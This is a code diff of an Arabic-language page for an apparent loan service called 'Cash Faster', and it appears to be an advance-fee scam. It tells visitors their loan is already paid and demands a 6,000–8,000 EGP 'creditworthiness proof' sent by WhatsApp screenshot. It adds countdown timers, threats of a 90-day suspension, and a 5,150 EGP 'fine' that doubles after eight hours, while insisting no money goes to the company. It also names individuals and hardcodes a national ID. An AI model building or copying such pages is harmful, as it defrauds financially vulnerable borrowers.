-        <div class="row"><span class="k">🔢 رقم المحفظة</span><span class="v">${customer.walletNum || 'سيتم تسجيله'}</span></div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  المؤقتات
-  // ================================================================
-  function startPendingTimer() {
-    if (pendingTimerInterval) clearInterval(pendingTimerInterval);
-    const pendingTimer = document.getElementById('pendingTimer');
-    if (pendingTimer) {
-      let seconds = PENDING_MINUTES * 60;
-      pendingTimerInterval = setInterval(() => {
-        if (seconds <= 0) {
-          clearInterval(pendingTimerInterval);
-          pendingTimer.innerText = "00:00";
-          return;
+    <script>
+        // ================================================================
+        //  CONFIG
+        // ================================================================
+        const WHATSAPP_NUMBER = "+639976737886";
+        const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER.replace(/\s/g, '')}`;
+        const PROOF_MINUTES = 45;
+        const PENDING_MINUTES = 40;
+
+        let currentCustomer = null;
+        let currentNationalId = null;
+        let timerInterval = null;
+        let pendingTimerInterval = null;
+        let isAdmin = false;
+        let adminClickCount = 0;
+
+        // ================================================================
+        //  INSTALLMENT PLAN
+        // ================================================================
+        const INSTALLMENT_PLAN = {
+            30000: { months: 12, installment: 3325 },
+            35000: { months: 12, installment: 3875 },
+            40000: { months: 18, installment: 2965 },
+            45000: { months: 18, installment: 3325 },
+            50000: { months: 24, installment: 2725 },
+            55000: { months: 24, installment: 3075 },
+            60000: { months: 24, installment: 3085 },
+            65000: { months: 26, installment: 3325 },
+            70000: { months: 26, installment: 3585 },
+            75000: { months: 26, installment: 3845 },
+            80000: { months: 30, installment: 3550 },
+            85000: { months: 30, installment: 3775 },
+            90000: { months: 30, installment: 3990 },
+            95000: { months: 30, installment: 4220 },
+            100000: { months: 32, installment: 4157 },
+            105000: { months: 32, installment: 4375 },
+            110000: { months: 32, installment: 4580 },
+            115000: { months: 38, installment: 4075 },
+            120000: { months: 38, installment: 4235 },
+            125000: { months: 38, installment: 4035 },
+            130000: { months: 42, installment: 4400 },
+            135000: { months: 42, installment: 4305 },
+            140000: { months: 42, installment: 4495 },
+            145000: { months: 48, installment: 4075 },
+            150000: { months: 48, installment: 4205 },
+            155000: { months: 48, installment: 4315 },
+            160000: { months: 48, installment: 4435 },
+            165000: { months: 48, installment: 4615 },
+            170000: { months: 48, installment: 4725 },
+            175000: { months: 48, installment: 4848 },
+            180000: { months: 54, installment: 4435 },
+            185000: { months: 54, installment: 4557 },
+            190000: { months: 60, installment: 4215 },
+            195000: { months: 60, installment: 4325 },
+            200000: { months: 60, installment: 4440 },
+        };
+
+        function getInstallmentPlan(loanAmount) {
+            const keys = Object.keys(INSTALLMENT_PLAN).map(Number).sort((a, b) => a - b);
+            let closest = keys[0];
+            for (let k of keys) {
+                if (k <= loanAmount) closest = k;
+                if (k >= loanAmount) break;
+            }
+            if (loanAmount > 200000) closest = 200000;
+            if (loanAmount < 30000) closest = 30000;
+            const plan = INSTALLMENT_PLAN[closest];
+            if (!plan) return { months: 12, installment: Math.round(loanAmount * 0.12) };
+            return { months: plan.months, installment: plan.installment };
         }
-        seconds--;
-        const m = Math.floor(seconds / 60);
-        const s = seconds % 60;
-        pendingTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      }, 1000);
-    }
-  }
 
-  function startOnePmTimer() {
-    if (pendingTimerInterval) clearInterval(pendingTimerInterval);
-    const pendingTimer = document.getElementById('pendingTimer');
-    if (pendingTimer) {
-      const now = new Date();
-      const onePm = new Date();
-      onePm.setHours(13, 0, 0, 0);
-      if (onePm <= now) onePm.setDate(onePm.getDate() + 1);
-      let seconds = Math.floor((onePm - now) / 1000);
-      const render = () => {
-        const h = Math.floor(seconds / 3600);
-        const m = Math.floor((seconds % 3600) / 60);
-        const s = seconds % 60;
-        pendingTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      };
-      render();
-      pendingTimerInterval = setInterval(() => {
-        if (seconds <= 0) { clearInterval(pendingTimerInterval); pendingTimer.innerText = "00:00:00"; return; }
-        seconds--;
-        render();
-      }, 1000);
-    }
-  }
-
-  function startPenaltyTimer() {
-    if (pendingTimerInterval) clearInterval(pendingTimerInterval);
-    const penaltyTimer = document.getElementById('penaltyTimer');
-    if (penaltyTimer) {
-      let seconds = 8 * 60 * 60;
-      const render = () => {
-        const h = Math.floor(seconds / 3600);
-        const m = Math.floor((seconds % 3600) / 60);
-        const s = seconds % 60;
-        penaltyTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      };
-      render();
-      pendingTimerInterval = setInterval(() => {
-        if (seconds <= 0) { clearInterval(pendingTimerInterval); penaltyTimer.innerText = "00:00:00"; return; }
-        seconds--;
-        render();
-      }, 1000);
-    }
-  }
-
-  function startTimers(customer) {
-    if (timerInterval) clearInterval(timerInterval);
-    const proofTimer = document.getElementById('proofTimer');
-    if (proofTimer) {
-      let seconds = PROOF_MINUTES * 60;
-      timerInterval = setInterval(() => {
-        if (seconds <= 0) { clearInterval(timerInterval); proofTimer.innerText = "00:00"; proofTimer.classList.add('danger'); return; }
-        seconds--;
-        const m = Math.floor(seconds / 60);
-        const s = seconds % 60;
-        proofTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-        if (seconds < 60) proofTimer.classList.add('danger');
-        else proofTimer.classList.remove('danger');
-      }, 1000);
-    }
-  }
-
-  // ================================================================
-  //  الأزرار
-  // ================================================================
-  function bindButtons(customer) {
-    const proofBtn = document.getElementById('proofBtn');
-    if (proofBtn) {
-      proofBtn.onclick = () => {
-        const proofAmount = getProofAmount(customer.loan, currentNationalId);
-        const plan = getInstallmentPlan(customer.loan);
-        const firstDate = getFirstInstallmentDate();
-        let msg = `📤 إرسال إثبات الجدارة الائتمانية\n\n👤 العميل: ${customer.name}\n🔢 الرقم القومي: ${currentNationalId}\n💼 الوظيفة: ${customer.job || 'غير مسجل'}\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\n🧾 مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\n💵 القسط الشهري: ${plan.installment.toLocaleString('ar-EG')} ج.م\n📅 مدة القسط: ${plan.months} شهر\n📆 أول قسط: ${firstDate}\n\n`;
-        if (customer.guarantor) {
-          msg += `👥 الضامن: ${customer.guarantor.name}\n🔗 صلة الضامن: ${customer.guarantor.relation}\n📞 رقم الضامن: ${customer.guarantor.phone || 'غير مسجل'}\n\n`;
+        function getProofAmount(loanAmount, nationalId) {
+            if (nationalId === "2921000995") {
+                return 8000;
+            }
+            if (loanAmount < 100000) return 6000;
+            else return 8000;
         }
-        msg += `✅ أقر أنا ${customer.name} بأنني قمت بإجراءات إثبات الجدارة الائتمانية كما هو موضح:\n1️⃣ قمت بإدخال مبلغ الإثبات إلى محفظتي\n2️⃣ التقطت لقطة شاشة للرصيد\n3️⃣ قمت بتحويل المبلغ مرة أخرى (أو سحبته)\n4️⃣ التقطت لقطة شاشة للخروج\n5️⃣ أرسلت الصور إلى قسم التحويلات المالية\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل.`;
-        openWhatsApp(msg);
-      };
-    }
 
-    const transferBtn = document.getElementById('transferBtn');
-    if (transferBtn) {
-      transferBtn.onclick = () => {
-        let msg = `📋 تأكيد استلام المبلغ\n\n👤 العميل: ${customer.name}\n🔢 الرقم القومي: ${currentNationalId}\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\n📱 رقم المحفظة: ${customer.walletNum || 'سيتم تحديده'}\n\n✅ أقر أنا ${customer.name} بأنني استلمت المبلغ على محفظتي.`;
-        openWhatsApp(msg);
-      };
-    }
+        function getFirstInstallmentDate() {
+            const now = new Date();
+            now.setDate(now.getDate() + 29);
+            return now.toLocaleDateString('ar-EG', { year: 'numeric', month: 'numeric', day: 'numeric' });
+        }
 
-    const supportBtn = document.getElementById('supportHeaderBtn');
-    if (supportBtn) {
-      supportBtn.onclick = () => {
-        openWhatsApp(`📞 طلب دعم فني\n👤 العميل: ${currentCustomer?.name || ''}\n🔢 الرقم القومي: ${currentNationalId || ''}`);
-      };
-    }
-  }
+        function openWhatsApp(customMessage) {
+            let msg = customMessage ||
+                `📤 إرسال إثبات الجدارة الائتمانية\n\nالعميل: ${currentCustomer ? currentCustomer.name : ''}\nالرقم القومي: ${currentNationalId || ''}\nالمبلغ المطلوب صرفه: ${currentCustomer ? currentCustomer.loan.toLocaleString('ar-EG') : ''} ج.م\n\nسأقوم بإرسال صور إثبات الجدارة لإتمام الصرف.`;
+            window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
+        }
 
-  // ================================================================
-  //  البحث
-  // ================================================================
-  function searchCustomer() {
-    const nationalId = document.getElementById('nationalId').value.trim();
-    if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
-    if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }
+        // ================================================================
+        //  DATABASE
+        // ================================================================
+        
+    
+        };
 
-    document.getElementById('loader').style.display = 'block';
-    document.getElementById('resultArea').innerHTML = '';
-    document.getElementById('errorBox').style.display = 'none';
+        // ================================================================
+        //  BUILD FUNCTIONS
+        // ================================================================
 
-    setTimeout(() => {
-      document.getElementById('loader').style.display = 'none';
-      const customer = customersDatabase[nationalId];
-      if (!customer) {
-        document.getElementById('errorBox').style.display = 'block';
-        currentCustomer = null;
-        currentNationalId = null;
-        return;
-      }
-      displayResult(customer, nationalId);
-    }, 600);
-  }
+        function buildLoanCard(customer) {
+            const plan = getInstallmentPlan(customer.loan);
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
+            const walletDisplay = customer.wallet || 'غير محدد';
 
-  // ================================================================
-  //  الأدمن
-  // ================================================================
-  function toggleAdmin() {
-    isAdmin = !isAdmin;
-    document.getElementById('adminPanel').classList.toggle('show', isAdmin);
-  }
+            return `
+                <div class="loan-card">
+                    <div class="label">💰 مبلغ التمويل المعتمد</div>
+                    <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
+                    <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم اعتماد القرض بنجاح <span style="font-size:0.65rem;color:var(--text-muted);margin-right:0.3rem;">— بإنتظار إثبات الجدارة</span></div>
+                    <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ لديك ${PROOF_MINUTES} دقيقة لإثبات جدارتك الائتمانية لاستلام المبلغ</div>
+                    <div class="loan-grid">
+                        <div class="item"><div class="lbl">المدة</div><div class="val">${plan.months} شهر</div></div>
+                        <div class="item"><div class="lbl">القسط الشهري</div><div class="val gold">${plan.installment.toLocaleString('ar-EG')} ج.م</div></div>
+                        <div class="item"><div class="lbl">المحفظة</div><div class="val">${walletDisplay}</div></div>
+                        <div class="item"><div class="lbl">رقم المحفظة</div><div class="val">${customer.walletNum || 'سيتم تحديده'}</div></div>
+                        <div class="item"><div class="lbl">الضامن</div><div class="val">${customer.guarantor?.name || 'غير مسجل'}</div></div>
+                        <div class="item"><div class="lbl">مبلغ الإثبات</div><div class="val gold">${proofAmount.toLocaleString('ar-EG')} ج.م</div></div>
+                    </div>
+                </div>
+            `;
+        }
 
-  function changeStatus(newStatus) {
-    if (!currentCustomer || !currentNationalId) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
-    const statusLabels = {
-      'active': '🟢 نشط',
-      'pending': '⏳ معلق',
-      'deleted': '🚫 مشطوب',
-      'completed': '✅ تم الاستلام'
-    };
-    if (!confirm(`هل أنت متأكد من تغيير حالة العميل ${currentCustomer.name} إلى "${statusLabels[newStatus] || newStatus}"؟`)) return;
-    customersDatabase[currentNationalId].status = newStatus;
-    document.getElementById('currentStatusText').textContent = statusLabels[newStatus] || newStatus;
-    displayResult(customersDatabase[currentNationalId], currentNationalId);
-    alert(`✅ تم تغيير الحالة إلى "${statusLabels[newStatus] || newStatus}" بنجاح.`);
-  }
+        function buildClientInfo(customer) {
+            return `
+                <div class="client-info">
+                    <div class="row"><span class="k">الاسم</span><span class="v">${customer.name}</span></div>
+                    <div class="row"><span class="k">الرقم القومي</span><span class="v gold">${currentNationalId}</span></div>
+                    <div class="row"><span class="k">الوظيفة</span><span class="v">${customer.job || 'غير مسجل'}</span></div>
+                    <div class="row"><span class="k">المحفظة</span><span class="v gold">${customer.wallet || 'غير محدد'}</span></div>
+                    <div class="row"><span class="k">رقم المحفظة</span><span class="v">${customer.walletNum || 'سيتم تسجيله'}</span></div>
+                    ${customer.guarantor ? `
+                        <div class="row"><span class="k">الضامن</span><span class="v">${customer.guarantor.name}</span></div>
+                        <div class="row"><span class="k">صلة الضامن</span><span class="v gold">${customer.guarantor.relation}</span></div>
+                        <div class="row"><span class="k">رقم الضامن</span><span class="v">${customer.guarantor.phone || 'غير مسجل'}</span></div>
+                    ` : ''}
+                </div>
+            `;
+        }
 
-  // ================================================================
-  //  الأحداث
-  // ================================================================
-  document.querySelector('.brand')?.addEventListener('click', function() {
-    adminClickCount++;
-    if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
-    setTimeout(() => { adminClickCount = 0; }, 3000);
-  });
+        function buildPaymentNotice(customer) {
+            return '';
+        }
 
-  document.getElementById('nationalId')?.addEventListener('keypress', e => {
-    if (e.key === 'Enter') searchCustomer();
-  });
+        function buildProofSection(customer) {
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
+            const plan = getInstallmentPlan(customer.loan);
 
-  window.searchCustomer = searchCustomer;
-  window.changeStatus = changeStatus;
-  window.openWhatsApp = openWhatsApp;
-</script>
+            return `
+                <div class="proof-section">
+                    <div class="proof-header">
+                        <span class="icon-big"><i class="fas fa-shield-alt"></i></span>
+                        <h2>🔐 إثبات الجدارة الائتمانية</h2>
+                        <div class="sub">هذا الإجراء منك إليك — لا يوجد أي تحويل أو دفع للشركة</div>
+                    </div>
+
+                    <div class="payment-notice">
+                        <span class="icon"><i class="fas fa-check-circle"></i></span>
+                        <h4>✅ تم دفع مبلغ القرض إلى حساب محفظة رقم ${customer.walletNum || '****'} — العميل ${customer.name}</h4>
+                        <p>من الآن أمامك <span class="hl-gold">${PROOF_MINUTES} دقيقة</span> لإثبات الجدارة الائتمانية المحددة لك.<br><span class="hl-danger">⚠️ في حالة عدم الإثبات خلال المدة المحددة، سيتم تعليق الطلب لمدة 90 يوماً.</span></p>
+                    </div>
+
+                    <div class="proof-amount-box">
+                        <div class="label">💰 المبلغ المطلوب لإثبات الجدارة</div>
+                        <div class="value">${proofAmount.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
+                        <div class="note"><span class="hl-emerald">✅ هذا المبلغ ليس للشركة</span> — بل لإثبات الجدية والجدارة الائتمانية<br><span class="hl-gold">🔒 سيتم تفعيل صرف المبلغ فى حسابك فور الإثبات</span></div>
+                    </div>
+
+                    <div class="timer-box">
+                        <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة</div>
+                        <div class="timer" id="proofTimer">${String(PROOF_MINUTES).padStart(2,'0')}:00</div>
+                        <div class="sub">⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري<br><span class="hl-danger">⚠️ بعد انتهاء الوقت سيتم تعليق الطلب 90 يوماً</span></div>
+                    </div>
+
+                    <div class="steps-box">
+                        <div class="step"><div class="num">1</div><div class="content"><strong>📥 استلام المبلغ في محفظتك</strong><br>قم بإدخال مبلغ <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> إلى محفظتك (اتصالات كاش) من أي مصدر تثق به.<span class="hl-emerald">✅ هذا المبلغ ليس للشركة، بل لإثبات الجدية والجدارة الائتمانية.</span></div></div>
+                        <div class="step"><div class="num">2</div><div class="content"><strong>📸 تصوير الرصيد بعد الاستلام</strong><br>التقط <span class="hl-gold">لقطة شاشة واضحة</span> تظهر المبلغ في حسابك بعد وصوله.<span class="hl-emerald">✅ تأكد من ظهور الرصيد بوضوح مع تاريخ العملية.</span></div></div>
+                        <div class="step"><div class="num">3</div><div class="content"><strong>🔄 تحويل المبلغ مرة أخرى (أو سحبه)</strong><br>قم بتحويل نفس المبلغ <span class="hl-gold">مرة أخرى</span> إلى أي شخص تابع لك (صديق/قريب) أو قم بسحبه.<span class="hl-emerald">✅ هذا لإثبات أن الحساب نشط وتستطيع إدارة أموالك.</span><br><span class="hl-danger">⚠️ هذا التحويل ليس للشركة — أنت المتحكم الوحيد في حسابك.</span></div></div>
+                        <div class="step"><div class="num">4</div><div class="content"><strong>📸 تصوير إشعار الخروج</strong><br>التقط <span class="hl-gold">لقطة شاشة</span> لإشعار خروج المبلغ من حسابك.<span class="hl-emerald">✅ تأكد من ظهور المبلغ المرسل وتاريخ العملية.</span></div></div>
+                        <div class="step"><div class="num">5</div><div class="content"><strong>📤 إرسال الصور لقسم التحويلات المالية</strong><br>أرسل صور <span class="hl-gold">الإيداع والتحويل</span> عبر واتساب إلى قسم التحويلات المالية.<span class="hl-emerald">✅ بعد الإرسال يتم <strong style="color:var(--emerald);">تفعيل الصرف مباشرة</strong> لحسابك.</span><br><span class="hl-danger">⚠️ الاثباتات المطلوبة يجب أن تكون خلال نصف ساعة من الآن — لا يتم قبول اثباتات قديمة.</span></div></div>
+                    </div>
+
+                    <div class="important-notes">
+                        <div class="title"><i class="fas fa-exclamation-triangle"></i> تنبيهات هامة</div>
+                        <ul>
+                            <li><span class="hl-danger">🔴 لا يوجد دفع ولا تحويل لنا</span> — كل الإجراءات منك إليك فقط لإثبات الجدارة.</li>
+                            <li><span class="hl-gold">⏰ المدة المحددة للإثبات: ${PROOF_MINUTES} دقيقة</span> — يجب الانتهاء قبل انتهاء الوقت.</li>
+                            <li><span class="hl-danger">🚫 لا يتم قبول اثباتات قديمة</span> — يجب أن تكون خلال نصف ساعة من الآن.</li>
+                            <li><span class="hl-gold">📌 في حالة عدم الإثبات</span> — يتم تعليق الطلب لمدة <span class="hl-danger">90 يوماً</span>.</li>
+                            <li><span class="hl-emerald">💰 الأقساط الشهرية</span> — ستكون مطالب بدفع الأقساط في مواعيدها المحددة.</li>
+                            <li><span class="hl-gold">📌 سيتم نزول القرض</span> — بعد 90 يوماً نظراً لأنه مدفوع إلى حسابك بالفعل.</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-box">
+                        <p><span class="hl-gold">🔑 الخلاصة:</span> إثبات الجدارة الائتمانية هو <span class="hl-emerald">مصلحة لك أولاً</span>، فهو يضمن أن القرض الذي ستحصل عليه مناسب لك، وأنك قادر على سداده براحة دون ضغط.<br><br><span class="hl-danger">⚠️ لابد من الانتهاء من الإجراءات اللازمة ليتم الصرف لحسابك فوراً.</span><br><br><span style="color: var(--text-muted); font-size: 0.7rem;">نحن هنا لدعمك في كل خطوة 💚<br>مع خالص التقدير، فريق كاش فاستر</span></p>
+                    </div>
+
+                    <button class="btn btn-whatsapp btn-purple" id="proofBtn"><i class="fas fa-paper-plane"></i> 📤 إرسال إثبات الجدارة الآن</button>
+                    <button class="btn btn-gold" id="transferBtn" style="margin-top:0.3rem;"><i class="fas fa-check-circle"></i> ✅ تأكيد استلام المبلغ</button>
+                    <div style="margin-top:0.6rem;text-align:center;font-size:0.6rem;color:var(--text-muted);position:relative;z-index:1;"><i class="fas fa-lock"></i> هذه العملية آمنة ومشفرة | لا توجد أي رسوم مطلوبة</div>
+                </div>
+            `;
+        }
+
+        // ================================================================
+        //  حالة خاصة 1: أحمد ناصر أحمد حسين النقيب (طلب معلق حتى الساعة 1 ظهراً)
+        // ================================================================
+        function buildPendingOnePmCard(customer) {
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
+            return `
+                <div class="pending-card">
+                    <div class="icon"><i class="fas fa-hourglass-half"></i></div>
+                    <h2>⏳ طلبك <span>معلق</span> حتى الساعة <span>الواحدة ظهراً</span></h2>
+
+                    <div class="pending-timer-box">
+                        <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
+                        <div class="timer" id="pendingTimer">--:--:--</div>
+                        <div class="label"><span class="hl-danger">⚠️ بعد الساعة الواحدة ظهراً سيتم حذف الطلب لمدة 90 يوماً</span></div>
+                    </div>
+
+                    <div class="sub">
+                        <span class="hl-danger">🔴 طلبك معلق حالياً حتى الساعة الواحدة ظهراً!</span><br><br>
+                        <span class="hl-gold">📌 يجب التواصل مع قسم التحويلات المالية على واتساب فوراً لفتح التعليق</span><br>
+                        ليتم قبول الإثبات ونزول مبلغ القرض إلى حسابك مباشرة.<br><br>
+                        <span class="hl-emerald">✅ مبلغ القرض مدفوع لحسابك بالفعل بمبلغ ${customer.loan.toLocaleString('ar-EG')} ج.م</span><br>
+                        وفي انتظار إثبات الجدارة الائتمانية فقط.<br><br>
+                        <span class="hl-gold">💰 مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م</span> — وسيتم تفعيل صرف المبلغ فوراً.<br><br>
+                        <span class="hl-emerald">✨ لا يوجد دفع ولا تحويل للشركة نهائياً</span><br>
+                        كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط.<br><br>
+                        <span class="hl-danger">⚠️ يرجى الانتهاء ليتم الصرف في خلال دقائق</span>
+                    </div>
+
+                    <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب استثناء لإثبات الجدارة الائتمانية\\n\\nالعميل: ${customer.name}\\nالرقم القومي: ${currentNationalId}\\nالمبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\nمبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\\n\\nأرجو عمل استثناء لإثبات الجدارة المطلوبة وفتح التعليق على الطلب الخاص بي.\\nعلماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
+                        <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح التعليق وعمل استثناء
+                    </button>
+
+                    <div class="note">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> 
+                        <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
+                        ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
+                    </div>
+
+                    <div style="margin-top:0.8rem;padding:0.8rem;background:rgba(46,204,113,0.06);border:1px solid rgba(46,204,113,0.15);border-radius:var(--radius-md);">
+                        <p style="color:var(--text-muted);font-size:0.75rem;line-height:1.8;margin:0;">
+                            <span style="color:var(--gold);font-weight:700;">💡 تذكر:</span><br>
+                            ✅ مبلغ الإثبات هو <span style="color:var(--purple);font-weight:700;">${proofAmount.toLocaleString('ar-EG')} ج.م</span><br>
+                            ✅ هذا المبلغ <span style="color:var(--emerald);font-weight:700;">ليس للشركة</span> — بل لإثبات الجدارة الائتمانية<br>
+                            ✅ سيتم <span style="color:var(--gold);font-weight:700;">صرف ${customer.loan.toLocaleString('ar-EG')} ج.م</span> لحسابك فور قبول الإثبات<br>
+                            ❌ <span style="color:var(--danger);font-weight:700;">لا تنتظر حتى تنتهي المدة</span> — تواصل الآن لفتح الطلب
+                        </p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ================================================================
+        //  حالة خاصة 2: عبد الحميد عبد الودود (مدان بالقرض + غرامة مالية)
+        // ================================================================
+        function buildDebtorCard(customer) {
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
+            const penalty = 5150;
+            return `
+                <div class="loan-card">
+                    <div class="label">💰 مبلغ التمويل المعتمد</div>
+                    <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
+                    <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم دفع القرض إلى حسابك بالفعل</div>
+                    <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ الجدارة الائتمانية محجوزة بقيمة ${proofAmount.toLocaleString('ar-EG')} ج.م وسيتم نزولها مرة أخرى</div>
+                    <div class="loan-grid">
+                        <div class="item"><div class="lbl">المبلغ المدفوع</div><div class="val green">${customer.loan.toLocaleString('ar-EG')} ج.م</div></div>
+                        <div class="item"><div class="lbl">الجدارة المحجوزة</div><div class="val gold">${proofAmount.toLocaleString('ar-EG')} ج.م</div></div>
+                        <div class="item"><div class="lbl">الغرامة المالية</div><div class="val danger">${penalty.toLocaleString('ar-EG')} ج.م</div></div>
+                    </div>
+                </div>
+
+                <div class="payment-notice">
+                    <span class="icon"><i class="fas fa-check-circle"></i></span>
+                    <h4>✅ تم دفع مبلغ القرض ${customer.loan.toLocaleString('ar-EG')} ج.م إلى حساب محفظة رقم ${customer.walletNum || '****'}</h4>
+                    <p>العميل: <span class="hl-gold">${customer.name}</span><br>
+                    الجدارة الائتمانية محجوزة بقيمة <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> وسيتم نزولها مرة أخرى.<br>
+                    <span class="hl-emerald">✅ تم إثبات الجدارة الائتمانية بالفعل</span> — لا تحتاج لإثباتها مرة أخرى.</p>
+                </div>
+
+                <div class="important-notes" style="border-right-color: var(--danger); background: rgba(239,68,68,0.06);">
+                    <div class="title"><i class="fas fa-exclamation-triangle"></i> تنبيهات هامة جداً</div>
+                    <ul>
+                        <li><span class="hl-danger">🔴 أنت مدان بالقرض المدفوع لحسابك</span> — يجب دفع الغرامة المالية.</li>
+                        <li><span class="hl-danger">💰 الغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م</span> — يجب دفعها خلال <span class="hl-gold">8 ساعات</span>.</li>
+                        <li><span class="hl-danger">⚠️ في حالة عدم الدفع خلال 8 ساعات</span> — تتضاعف الغرامة المالية.</li>
+                        <li><span class="hl-gold">📌 في حالة شطب الطلب</span> — يتم استرداد طلبك مرة أخرى بعد مرور <span class="hl-danger">90 يوماً</span>.</li>
+                        <li><span class="hl-danger">🚫 لن تتمكن من استرداد طلبك قبل هذه المدة.</span></li>
+                        <li><span class="hl-emerald">✅ يرجى الانتهاء ليتم الصرف في خلال دقائق.</span></li>
+                    </ul>
+                </div>
+
+                <div class="timer-box" style="border-color: var(--danger); background: rgba(239,68,68,0.06);">
+                    <div><i class="fas fa-stopwatch" style="color:var(--danger);"></i> الوقت المتبقي لدفع الغرامة</div>
+                    <div class="timer" id="penaltyTimer" style="color:var(--danger);">08:00:00</div>
+                    <div class="sub">⏳ يجب دفع الغرامة قبل انتهاء الوقت لتجنب تضاعفها<br><span class="hl-danger">⚠️ بعد انتهاء الوقت تتضاعف الغرامة المالية</span></div>
+                </div>
+
+                <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 دفع الغرامة المالية\\n\\nالعميل: ${customer.name}\\nالرقم القومي: ${currentNationalId}\\nالمبلغ المدفوع: ${customer.loan.toLocaleString('ar-EG')} ج.م\\nالجدارة المحجوزة: ${proofAmount.toLocaleString('ar-EG')} ج.م\\nالغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م\\n\\nأرجو دفع الغرامة المالية لتجنب تضاعفها.')">
+                    <i class="fab fa-whatsapp"></i> 📞 تواصل لدفع الغرامة المالية
+                </button>
+
+                <div class="summary-box" style="border-right-color: var(--danger); background: rgba(239,68,68,0.04);">
+                    <p><span class="hl-gold">🔑 الخلاصة:</span> القرض مدفوع لحسابك بالفعل بمبلغ <span class="hl-emerald">${customer.loan.toLocaleString('ar-EG')} ج.م</span>، والجدارة الائتمانية محجوزة بقيمة <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> وسيتم نزولها مرة أخرى.<br><br><span class="hl-danger">⚠️ لابد من دفع الغرامة المالية ${penalty.toLocaleString('ar-EG')} ج.م قبل مرور 8 ساعات حتى لا تتضاعف.</span><br><br><span style="color: var(--text-muted); font-size: 0.7rem;">نحن هنا لدعمك في كل خطوة 💚<br>مع خالص التقدير، فريق كاش فاستر</span></p>
+                </div>
+
+                <div class="client-info" style="margin-top:0.6rem;">
+                    <div class="row"><span class="k">الاسم</span><span class="v">${customer.name}</span></div>
+                    <div class="row"><span class="k">الرقم القومي</span><span class="v gold">${currentNationalId}</span></div>
+                    <div class="row"><span class="k">الوظيفة</span><span class="v">${customer.job || 'غير مسجل'}</span></div>
+                    <div class="row"><span class="k">المحفظة</span><span class="v gold">${customer.wallet || 'غير محدد'}</span></div>
+                    <div class="row"><span class="k">رقم المحفظة</span><span class="v">${customer.walletNum || 'سيتم تسجيله'}</span></div>
+                </div>
+            `;
+        }
+
+        function buildPendingCard(customer) {
+            return `
+                <div class="pending-card">
+                    <div class="icon"><i class="fas fa-hourglass-half"></i></div>
+                    <h2>⏳ طلبك <span>معلق</span></h2>
+                    
+                    <div class="pending-timer-box">
+                        <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
+                        <div class="timer" id="pendingTimer">${String(PENDING_MINUTES).padStart(2,'0')}:00</div>
+                        <div class="label"><span class="hl-danger">⚠️ بعد انتهاء الوقت سيتم حذف الطلب لمدة 90 يوماً</span></div>
+                    </div>
+
+                    <div class="sub">
+                        <span class="hl-danger">🔴 طلبك معلق حالياً!</span><br><br>
+                        <span class="hl-gold">📌 يجب فتح التعليق قبل عملية الإثبات بمدة 30 دقيقة</span><br>
+                        ليتم قبول الإثبات ونزول مبلغ القرض إلى الحساب مباشرة.<br><br>
+                        <span class="hl-danger">⚠️ إذا تم الإثبات والطلب معلق، لن يتم قبوله</span><br>
+                        وسيتم مطالبتك بإثبات مرة أخرى حديث.<br><br>
+                        <span class="hl-danger">⛔ إذا انتهى الوقت سيتم حذف الطلب لمدة 90 يوماً</span><br>
+                        ولن تتمكن من استرداد طلبك مرة أخرى.<br><br>
